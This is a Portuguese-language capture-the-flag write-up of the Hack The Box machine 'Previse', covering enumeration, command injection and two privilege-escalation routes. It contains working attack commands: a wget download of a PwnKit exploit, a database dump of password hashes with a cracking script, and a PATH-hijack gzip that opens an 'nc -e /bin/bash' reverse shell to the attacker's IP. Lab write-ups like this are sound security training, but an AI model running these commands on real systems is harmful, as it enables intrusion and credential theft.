Previse
========================

## Enumeration

    sudo nmap_enum previse.htb | tee nmap_output.txt
    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn previse.htb | tee nmap_udp_output.txt
    sudo nmap -p- -Pn -T5 -n previse.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-lxaOdJ](../../../media/qownnotes-media-lxaOdJ.png)

    nikto -host http://previse.htb -T x 6 | tee nikto_output.txt
 
 ![qownnotes-media-HjKUdj](../../../media/qownnotes-media-HjKUdj.png)
  
    sudo nmap -p- -Pn -T5 -n previse.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-oZwiit](../../../media/qownnotes-media-oZwiit.png)

    sudo nmap -sS --script vuln -n -T5 -Pn previse.htb -p 22,80 | tee nmap_vulns.txt

![qownnotes-media-mxzNhU](../../../media/qownnotes-media-mxzNhU.png)


    gobuster dir -u http://previse.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_s_ext_gobuster.txt"

![qownnotes-media-kXDXCL](../../../media/qownnotes-media-kXDXCL.png)

    gobuster dir -u http://previse.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"

![qownnotes-media-hiNVri](../../../media/qownnotes-media-hiNVri.png)

Com base nisso, eu fiz uma requisição via curl e consigo ver o conteúdo da página:

    curl http://previse.htb/file_logs.php

![qownnotes-media-iLdcrS](../../../media/qownnotes-media-iLdcrS.png)

## Exploitation

Comecei a fazer com o burp e consegui enumerar um usuário:


![qownnotes-media-NdUWaQ](../../../media/qownnotes-media-NdUWaQ.png)


Até que usei de uma malícia pra conseguir acessar os recursos da aplicação sem estar autenticado:

![qownnotes-media-bSDibS](../../../media/qownnotes-media-bSDibS.png)

E comecei a frequentar as páginas da aplicação desta forma, dado que a resposta vinha, mesmo recebendo 302:

Na verdade eu criei um usuário na aplicação, porém, sem necessidade. Visto que não era necessário se autenticar para obter o código fonte da aplicação...

![qownnotes-media-pCeUBz](../../../media/qownnotes-media-pCeUBz.png)

Descomprimi esse cara:

![qownnotes-media-HKNfah](../../../media/qownnotes-media-HKNfah.png)

Depois fui analisar o código da aplicação e encontrei o entry point:

![qownnotes-media-RvwiQn](../../../media/qownnotes-media-RvwiQn.png)

Então notei que teria de fazer uma concatenação de comandos de SO para conseguir obter shell no servidor, porém, sem sucesso, pois a resposta do comando não retorna na página:

![qownnotes-media-UopzoA](../../../media/qownnotes-media-UopzoA.png)

E tentei com o intruder também com o seclists:

![qownnotes-media-pBDRwo](../../../media/qownnotes-media-pBDRwo.png)

Sem sucesso, até que fiz um teste básico para ver se estava conseguindo executar comandos na máquina da seguinte maneira:

    nc -nlvp 8081

![qownnotes-media-ORzpgK](../../../media/qownnotes-media-ORzpgK.png)

 e eu recebi a conexão:
 
 ![qownnotes-media-YGtlXk](../../../media/qownnotes-media-YGtlXk.png)

Então eu recebi essa conexão e fiz o comando funcionar:

![qownnotes-media-sPJWSH](../../../media/qownnotes-media-sPJWSH.png)

![qownnotes-media-QvIaGf](../../../media/qownnotes-media-QvIaGf.png)


## PrivEsc

### Cenario 1

Enumerate SUID
    
    find / -perm -u=s -type f 2>/dev/null

    wget http://10.10.14.13/4-privilege_escalation/PwnKit_comp
    
    chmod +x PwnKit_comp
    
    ./PwnKit_comp

![qownnotes-media-mkWgxR](../../../media/qownnotes-media-mkWgxR.png)

###  Cenario 2 (mais interessante)

Pegando o que eu consegui da base de dados do usuário m4lwhere

    id
    ls
    cat config.php

![qownnotes-media-BgyUDr](../../../media/qownnotes-media-BgyUDr.png)

    mysql -u root -p
    use previse
    show tables
    select * from accounts;

![qownnotes-media-scXRzj](../../../media/qownnotes-media-scXRzj.png)

Dai eu fui dar uma olhada no código pra ver como ele estava encryptando essa senha, mas na verdade é uma função de hash de senha que ele está usando:

![qownnotes-media-FQKJCj](../../../media/qownnotes-media-FQKJCj.png)

Então, com base nisso eu fiz um script para crackear a senha:

```
┌──(acosta㉿kali)-[~/owncloud/Area_de_trabalho/estudos/hack_the_box/previse]
└─$ cat decrypt.php                                                                                                 
<?php

$lines = file($argv[1]);

$u_input = readline('Enter the hash: ');

foreach ($lines as $line) {
        if (strcmp(crypt(trim($line), '$1$🧂llol$'), $u_input) == 0) {
                printf("your password is: ". $line."\n");
                exit();
        }
}
?>
```  

![qownnotes-media-HdTcGc](../../../media/qownnotes-media-HdTcGc.png)

Com essa senha já foi possível logar via ssh:

    ssh m4lwhere@previse.htb
    
![qownnotes-media-bfiLgJ](../../../media/qownnotes-media-bfiLgJ.png)


    sudo -l

Eu testei alguns exploits antes, mas não é necvessário reportá-los aqui... Vide que a técnica interessante aprendida aqui foi o lance de utilizar a variável PATH pra conseguir intertceptar o binário gzip (o qual está sendo executado dentro do script access_backup.sh)

    export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
 ![qownnotes-media-YKKdGG](../../../media/qownnotes-media-YKKdGG.png)

Dentro da pasta /tmp eu coloquei um arquivo chamado gzip com o seguinte conteúdo:

    #!/bin/bash
    
    nc -e /bin/bash 10.10.14.13 9003
 
 Voltando para o terminal, bastou executar o script cmo sudo:
 
     chmod +x /tmp/gzip
     sudo /opt/scripts/access_backup.sh
 
 
 Na máquina do atacante:
 
     nc -nlvp 9003
 
 ![qownnotes-media-pTJSoo](../../../media/qownnotes-media-pTJSoo.png)
